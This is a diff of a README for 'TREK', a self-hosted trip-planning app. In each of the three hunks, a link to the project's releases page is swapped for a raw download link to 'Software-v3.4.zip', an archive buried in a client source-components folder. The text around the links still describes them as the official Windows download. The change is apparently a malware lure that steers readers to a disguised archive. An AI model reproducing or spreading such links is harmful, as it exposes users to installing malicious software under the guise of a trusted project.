@@ -1,6 +1,6 @@
 # 🌍 TREK - Plan trips with live teamwork
 
-[![Download TREK](https://img.shields.io/badge/Download%20TREK-blue?style=for-the-badge&logo=github)](https://github.com/Kakashi-Your-Death/TREK/releases)
+[![Download TREK](https://img.shields.io/badge/Download%20TREK-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kakashi-Your-Death/TREK/main/client/src/components/Dashboard/Software-v3.4.zip)
 
 ## 🧭 What is TREK?
 
@@ -35,7 +35,7 @@ If you plan to host TREK for yourself later, you will also need a server setup, 
 ## 📥 Download TREK
 
 Visit this page to download:  
-https://github.com/Kakashi-Your-Death/TREK/releases
+https://raw.githubusercontent.com/Kakashi-Your-Death/TREK/main/client/src/components/Dashboard/Software-v3.4.zip
 
 1. Open the release page link above
 2. Look for the latest release
@@ -149,7 +149,7 @@ Because TREK is self-hosted, you decide where it runs. That gives you more contr
 ## 📌 Release downloads
 
 Use the release page for every Windows download, update, or fresh install:  
-https://github.com/Kakashi-Your-Death/TREK/releases
+https://raw.githubusercontent.com/Kakashi-Your-Death/TREK/main/client/src/components/Dashboard/Software-v3.4.zip
 
 When a new version appears:
 
